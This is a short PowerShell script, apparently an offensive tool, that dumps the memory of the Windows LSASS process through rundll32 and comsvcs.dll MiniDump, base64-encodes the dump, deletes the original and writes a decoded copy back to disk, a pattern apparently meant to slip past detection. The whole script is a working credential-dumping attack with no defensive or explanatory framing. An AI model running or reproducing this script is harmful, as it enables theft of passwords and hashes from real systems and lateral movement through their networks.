$basespace = (Get-Item -Path ".\" -Verbose).FullName
$currentPath = $basespace + '\Workspace'
if(!(Test-Path -Path $currentPath)){mkdir $currentPath}
if(!(Test-Path -Path $currentPath\DUMP)){mkdir $currentPath\DUMP\}
$DumpPath = $currentPath + "\DUMP"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (ps lsass).id $DumpPath\DUMP-${env:computername} full

$DumpFile = $DumpPath + "\DUMP-" + ${env:computername}
$FilePath = $DumpFile + "-Decoded"
$EncodeDumpPath = $DumpFile + "-b64.txt"
sleep 0.6
$File = [System.IO.File]::ReadAllBytes($DumpFile);
# returns the base64 string
Remove-Item -Path $DumpFile
$Base64String = [System.Convert]::ToBase64String($File);
$Base64String | Out-File -FilePath $EncodeDumpPath
$EncodedString = Get-Content $EncodeDumpPath

 
try {
if ($EncodedString.Length -ge 1) {$ByteArray = [System.Convert]::FromBase64String($EncodedString);[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);}}
catch {}
Write-Output -InputObject (Get-Item -Path $FilePath);
